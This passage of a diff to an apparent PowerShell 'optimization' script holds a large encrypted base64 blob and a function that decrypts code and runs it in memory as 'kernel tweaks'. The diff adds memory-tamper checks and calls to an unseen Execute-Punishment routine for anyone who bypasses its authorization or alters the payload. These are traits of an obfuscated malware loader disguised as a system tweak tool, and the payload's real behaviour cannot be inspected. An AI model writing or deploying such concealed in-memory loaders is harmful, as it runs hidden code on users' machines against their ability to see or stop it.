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"
 
 function Invoke-ProtectedOptimization {
-    if (-not $global:_authLegit -or -not $authenticated) {
-        Write-Host "  [ACCESS DENIED] Unauthorized execution bypass detected." -ForegroundColor Red
+    if (-not $global:_authLegit -or -not $authenticated -or (Check-MemoryTamper)) {
+        Execute-Punishment "UNAUTHORIZED_PAYLOAD_BYPASS_ATTEMPT"
         exit 1
     }
     
@@ -2645,7 +2402,7 @@ function Invoke-ProtectedOptimization {
         # Execute decrypted kernel tweaks in memory
         . ([ScriptBlock]::Create($decryptedCode))
     } catch {
-        Write-Host "  [ERROR] Payload integrity check failed or corrupted key." -ForegroundColor Red
+        Execute-Punishment "PAYLOAD_TAMPER_OR_KEY_CORRUPTION"
         exit 1
     }
 }
